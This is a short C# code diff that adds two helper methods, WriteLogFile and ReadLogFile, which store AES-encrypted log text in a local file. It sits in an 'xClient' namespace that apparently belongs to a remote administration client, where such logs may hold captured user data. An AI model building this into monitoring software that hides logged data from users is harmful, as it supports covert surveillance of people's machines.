@@ -1,6 +1,8 @@
 ﻿using System;
 using System.IO;
 using System.Text;
+using xClient.Config;
+using xClient.Core.Cryptography;
 using xClient.Core.Data;
 using xClient.Core.Utilities;
 
@@ -143,6 +145,32 @@ namespace xClient.Core.Helper
             {
                 return false;
             }
+        }
+
+        /// <summary>
+        /// Appends text to a log file.
+        /// </summary>
+        /// <param name="filename">The filename of the log.</param>
+        /// <param name="appendText">The text to append.</param>
+        public static void WriteLogFile(string filename, string appendText)
+        {
+            appendText = ReadLogFile(filename) + appendText;
+
+            using (FileStream fStream = File.Open(filename, FileMode.Create, FileAccess.Write))
+            {
+                byte[] data = AES.Encrypt(Encoding.UTF8.GetBytes(appendText));
+                fStream.Seek(0, SeekOrigin.Begin);
+                fStream.Write(data, 0, data.Length);
+            }
+        }
+
+        /// <summary>
+        /// Reads a log file.
+        /// </summary>
+        /// <param name="filename">The filename of the log.</param>
+        public static string ReadLogFile(string filename)
+        {
+            return File.Exists(filename) ? Encoding.UTF8.GetString(AES.Decrypt(File.ReadAllBytes(filename))) : string.Empty;
         }
     }
 }
